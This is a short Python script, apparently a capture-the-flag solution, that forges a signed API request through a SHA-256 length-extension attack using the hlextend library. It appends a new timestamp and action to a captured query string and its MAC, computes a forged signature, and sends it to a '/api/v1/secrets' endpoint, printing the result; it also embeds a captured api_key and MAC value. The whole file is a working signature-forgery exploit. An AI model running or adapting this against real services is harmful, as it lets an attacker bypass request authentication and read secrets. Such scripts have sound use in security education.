import hashlib
import hlextend
import re
import requests
import time
import urllib

query_string = 'api_key=62c87a343ba883fbd8be60f82fee50a7a5d04f647866707521b29031ee55db61&timestamp=1616207779&action=read'
orig_hmac='f3c880a3e813662beacfae0334be5c678613606358f9d5e979cd0f0c7b3419f1'

h = hlextend.new('sha256')
evil_query = h.extend(
    f'&timestamp={int(time.time())}&action=read'.encode(), query_string.encode(),
    32, orig_hmac, raw=True)
new_hmac = h.hexdigest()
evil_query_tuples = list(map(lambda x: tuple(x.split(b'=', 1)), evil_query.split(b'&')))
evil_urlencode = urllib.parse.urlencode(evil_query_tuples)
print('evil_urlencode', evil_urlencode)

evil_query = evil_urlencode + '&hmac=' + new_hmac
r = requests.get(f'http://rmrfslash.xyz:8003/api/v1/secrets?{evil_query}')
print(r.status_code)
print(r.text)
